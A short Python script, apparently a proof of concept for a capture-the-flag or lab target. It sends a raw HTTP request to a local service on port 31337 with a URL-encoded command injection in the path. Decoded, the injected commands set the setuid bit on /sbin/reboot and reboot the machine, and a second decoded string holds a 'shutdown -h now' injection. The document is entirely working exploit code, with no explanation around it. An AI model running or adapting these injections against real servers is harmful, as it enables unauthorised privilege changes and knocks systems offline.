import socket

host = "localhost"
port = 31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

s.send("GET %2F%20%26%20chmod%20%2Bs%20%2Fsbin%2Freboot%20%26%20reboot HTTP/1.1\r\nhost: extern\r\n\r\n".encode("utf-8"))

received = ""
while 1:
	data = s.recv(1024).decode("latin-1")
	if data:
		received += data
	else:
		break

print(repr(received))

s.close()

import urllib.parse
print(urllib.parse.unquote("%2F%22%20shutdown%20-h%20now%22"))

